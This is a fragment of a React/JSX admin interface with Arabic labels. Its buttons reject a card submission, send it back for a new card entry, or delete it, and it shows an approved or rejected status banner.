                                </Button>
                                <Button
                                  disabled={selectedIsUpdating || selectedIsDeleting}
                                  onClick={() => updateState(selectedSub.id, 'rejected')}
                                  className="flex-1 bg-red-600 hover:bg-red-700 text-white gap-2 h-10"
                                >
                                  {selectedIsUpdating ? <RefreshCw className="w-4 h-4 animate-spin" /> : <XCircle className="w-4 h-4" />}
                                  رفض الطلب
                                </Button>
                                <Button
                                  disabled={selectedIsUpdating || selectedIsDeleting}
                                  onClick={() => void sendBackToCardEntry(selectedSub.id)}
                                  className="flex-1 bg-amber-600 hover:bg-amber-700 text-white gap-2 h-10"
                                >
                                  {selectedIsUpdating ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Clock className="w-4 h-4" />}
                                  إعادة لإضافة بطاقة جديدة
                                </Button>
                              </div>
                            )}

                            <div className="pt-1">
                              <Button
                                type="button"
                                disabled={selectedIsDeleting || selectedIsUpdating}
                                onClick={() => void deleteSubmission(selectedSub.id)}
                                className="w-full bg-slate-800 hover:bg-slate-700 text-white gap-2 h-10"
                              >
                                {selectedIsDeleting ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Trash2 className="w-4 h-4" />}
                                حذف الطلب
                              </Button>
                            </div>

                            {!selectedIsPending && (
                              <div className={`rounded-xl p-3 text-center text-sm font-semibold ${
                                selectedSub.cardState === 'approved'
                                  ? 'bg-green-50 text-green-700 border border-green-200'
                                  : 'bg-red-50 text-red-700 border border-red-200'
                              }`}>
                                {selectedSub.cardState === 'approved' ? '✓ تم قبول هذا الطلب' : '✗ تم رفض هذا الطلب'}
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </section>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
